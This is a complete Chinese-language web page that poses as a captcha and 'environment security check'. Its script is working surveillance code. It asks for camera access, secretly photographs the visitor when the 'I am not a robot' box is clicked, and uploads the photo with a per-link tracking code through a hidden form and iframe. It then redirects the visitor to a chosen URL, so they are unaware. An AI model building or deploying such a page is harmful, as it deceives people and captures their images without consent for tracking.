<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>验证中...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loading-container, .captcha-container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            max-width: 380px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { color: #666; font-size: 16px; margin-bottom: 10px; }
        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-top: 20px; }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
        .captcha-container { display: none; }
        .captcha-icon { font-size: 48px; margin-bottom: 15px; }
        .captcha-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .captcha-desc { color: #666; font-size: 14px; margin-bottom: 20px; }
        .checkbox-area {
            display: inline-block; width: 24px; height: 24px; border: 2px solid #ccc;
            border-radius: 4px; margin-right: 10px; cursor: pointer; background: white;
        }
        .checkbox-area.checked { background: #667eea; border-color: #667eea; position: relative; }
        .checkbox-area.checked::after { content: '✓'; color: white; font-size: 16px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        .verify-row { display: flex; align-items: center; justify-content: center; margin-top: 20px; cursor: pointer; }
        .camera-preview { width: 100%; max-width: 280px; margin: 12px auto; border-radius: 16px; overflow: hidden; background: #333; display: none; }
        .camera-preview video { width: 100%; height: auto; display: block; }
        .camera-status { font-size: 12px; margin-top: 10px; color: #28a745; }
        .camera-status.error { color: #ff3b30; }
        .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
        #uploadResult { margin-top: 12px; font-size: 13px; word-break: break-word; min-height: 20px; }
        .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
        iframe { display: none; }
    </style>
</head>
<body>

    <!-- 加载界面 -->
    <div class="loading-container" id="loadingContainer">
        <div class="spinner"></div>
        <div class="loading-text">正在验证环境安全...</div>
        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化摄像头...</div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        <div class="code-badge">验证编号: <span id="displayCode"></span></div>
        <div class="camera-status" id="cameraStatus">⏳ 等待摄像头授权...</div>
        <div class="debug-info" id="debugInfo"></div>
    </div>

    <!-- 验证界面 -->
    <div class="captcha-container" id="captchaContainer">
        <div class="captcha-icon">🤖</div>
        <div class="captcha-title">人机验证</div>
        <div class="captcha-desc">请完成验证以继续访问</div>
        <div class="camera-preview" id="cameraPreview">
            <video id="previewVideo" autoplay playsinline muted></video>
        </div>
        <div class="verify-row" id="verifyRow">
            <div class="checkbox-area" id="checkbox"></div>
            <span>我不是机器人</span>
        </div>
        <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
        <div id="uploadResult"></div>
    </div>

    <!-- 隐藏的 video 和 canvas -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <!-- 隐藏的表单和 iframe -->
    <form id="uploadForm" method="POST" enctype="multipart/form-data" target="uploadFrame">
        <input type="hidden" name="action" value="capture_photo">
        <input type="hidden" name="code" id="formCode">
        <input type="hidden" name="target_url" id="formTargetUrl">
        <input type="file" name="photo_data" id="formFile" style="display:none;">
    </form>
    <iframe name="uploadFrame" id="uploadFrame"></iframe>

    <script>
    // ================================================================
    // 极简稳定版：使用表单提交，彻底解决分片问题
    // ================================================================
    
    var urlParams = new URLSearchParams(window.location.search);
    var code = urlParams.get('code') || 'UNKNOWN';
    var targetUrl = urlParams.get('url') || 'https://www.baidu.com';
    
    document.getElementById('displayCode').textContent = code;
    document.getElementById('displayCode2').textContent = code;
    document.getElementById('debugInfo').textContent = '编号: ' + code + ' | 跳转: ' + targetUrl;

    // 设置表单字段
    document.getElementById('formCode').value = code;
    document.getElementById('formTargetUrl').value = targetUrl;

    // ================================================================
    // 全局变量
    // ================================================================
    var videoElement = null;
    var canvasElement = null;
    var stream = null;
    var cameraReady = false;
    var verified = false;
    var progressValue = 0;

    // ================================================================
    // 进度条动画
    // ================================================================
    var progressInterval = setInterval(function() {
        if (progressValue < 90) {
            progressValue += Math.random() * 12;
            if (progressValue > 90) progressValue = 90;
            document.getElementById('progressFill').style.width = progressValue + '%';
        }
    }, 200);

    // ================================================================
    // 1. 请求摄像头权限
    // ================================================================
    function startCamera() {
        var statusEl = document.getElementById('cameraStatus');
        statusEl.textContent = '⏳ 请求摄像头权限...';
        
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            statusEl.textContent = '❌ 浏览器不支持摄像头';
            statusEl.className = 'camera-status error';
            fallbackNoCamera();
            return;
        }
        
        var constraints = {
            video: {
                facingMode: 'user',
                width: { ideal: 320 },
                height: { ideal: 240 }
            },
            audio: false
        };
        
        navigator.mediaDevices.getUserMedia(constraints)
            .then(function(mediaStream) {
                stream = mediaStream;
                statusEl.textContent = '✅ 摄像头已就绪';
                statusEl.className = 'camera-status';
                cameraReady = true;
                
                videoElement = document.getElementById('video');
                videoElement.srcObject = stream;
                
                var previewVideo = document.getElementById('previewVideo');
                previewVideo.srcObject = stream;
                document.getElementById('cameraPreview').style.display = 'block';
                
                videoElement.onloadedmetadata = function() {
                    videoElement.play();
                    progressValue = 100;
                    document.getElementById('progressFill').style.width = '100%';
                    clearInterval(progressInterval);
                    
                    setTimeout(function() {
                        document.getElementById('loadingContainer').style.display = 'none';
                        document.getElementById('captchaContainer').style.display = 'block';
                    }, 500);
                };
            })
            .catch(function(err) {
                console.error('摄像头错误:', err);
                statusEl.textContent = '⚠️ 无法访问摄像头: ' + err.message;
                statusEl.className = 'camera-status error';
                fallbackNoCamera();
            });
    }

    function fallbackNoCamera() {
        setTimeout(function() {
            document.getElementById('loadingContainer').style.display = 'none';
            document.getElementById('captchaContainer').style.display = 'block';
            cameraReady = false;
        }, 1500);
    }

    // ================================================================
    // 2. 拍照并转换为 Blob
    // ================================================================
    function capturePhotoBlob() {
        return new Promise(function(resolve, reject) {
            if (!videoElement || !cameraReady) {
                reject('摄像头未就绪');
                return;
            }
            var canvas = document.getElementById('canvas');
            var ctx = canvas.getContext('2d');
            if (videoElement.videoWidth === 0) {
                reject('视频流未就绪');
                return;
            }
            var w = Math.min(videoElement.videoWidth, 320);
            var h = Math.min(videoElement.videoHeight, 240);
            canvas.width = w;
            canvas.height = h;
            ctx.drawImage(videoElement, 0, 0, w, h);
            
            // 转换为 Blob
            canvas.toBlob(function(blob) {
                if (blob) {
                    resolve(blob);
                } else {
                    reject('转换Blob失败');
                }
            }, 'image/jpeg', 0.7);
        });
    }

    // ================================================================
    // 3. 提交表单（使用 iframe 接收响应）
    // ================================================================
    function submitForm(blob) {
        return new Promise(function(resolve, reject) {
            var fileInput = document.getElementById('formFile');
            // 使用 DataTransfer 构造 File 对象
            var file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
            var dataTransfer = new DataTransfer();
            dataTransfer.items.add(file);
            fileInput.files = dataTransfer.files;
            
            var iframe = document.getElementById('uploadFrame');
            var form = document.getElementById('uploadForm');
            var resultDiv = document.getElementById('uploadResult');
            
            // 监听 iframe 加载完成
            var finished = false;
            var timeoutId = setTimeout(function() {
                if (!finished) {
                    finished = true;
                    reject(new Error('上传超时（30秒）'));
                }
            }, 30000);
            
            iframe.onload = function() {
                if (finished) return;
                finished = true;
                clearTimeout(timeoutId);
                
                try {
                    var responseText = '';
                    try {
                        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        if (iframeDoc && iframeDoc.body) {
                            responseText = iframeDoc.body.textContent || iframeDoc.body.innerText || '';
                        }
                    } catch (e) {
                        // 跨域限制，但同源不会发生
                        responseText = iframe.contentWindow.document.body.textContent;
                    }
                    
                    // 解析 JSON
                    var result = JSON.parse(responseText);
                    if (result.success) {
                        resolve(result);
                    } else {
                        reject(new Error(result.error || '上传失败'));
                    }
                } catch (e) {
                    reject(new Error('解析响应失败: ' + responseText.substring(0, 100)));
                }
            };
            
            // 提交表单
            form.submit();
        });
    }

    // ================================================================
    // 4. 主流程
    // ================================================================
    function startProcess() {
        if (verified) return;
        verified = true;
        
        var checkbox = document.getElementById('checkbox');
        checkbox.classList.add('checked');
        document.querySelector('#verifyRow span').textContent = '验证中...';
        
        var resultDiv = document.getElementById('uploadResult');
        resultDiv.textContent = '📸 拍照中...';
        resultDiv.style.color = '#007aff';
        
        capturePhotoBlob()
            .then(function(blob) {
                resultDiv.textContent = '📤 上传中...';
                return submitForm(blob);
            })
            .then(function(result) {
                resultDiv.textContent = '✅ 上传成功！即将跳转...';
                resultDiv.style.color = '#34c759';
                if (stream) {
                    stream.getTracks().forEach(function(t) { t.stop(); });
                }
                setTimeout(function() {
                    window.location.href = targetUrl;
                }, 2000);
            })
            .catch(function(err) {
                resultDiv.textContent = '❌ ' + err.message;
                resultDiv.style.color = '#ff3b30';
                // 即使失败也跳转
                setTimeout(function() {
                    window.location.href = targetUrl;
                }, 4000);
            });
    }

    // ================================================================
    // 5. 绑定事件
    // ================================================================
    document.getElementById('verifyRow').addEventListener('click', function() {
        if (verified) return;
        startProcess();
    });

    // ================================================================
    // 6. 启动
    // ================================================================
    startCamera();

    window.addEventListener('beforeunload', function() {
        if (stream) {
            stream.getTracks().forEach(function(t) { t.stop(); });
        }
    });
    </script>
</body>
</html>
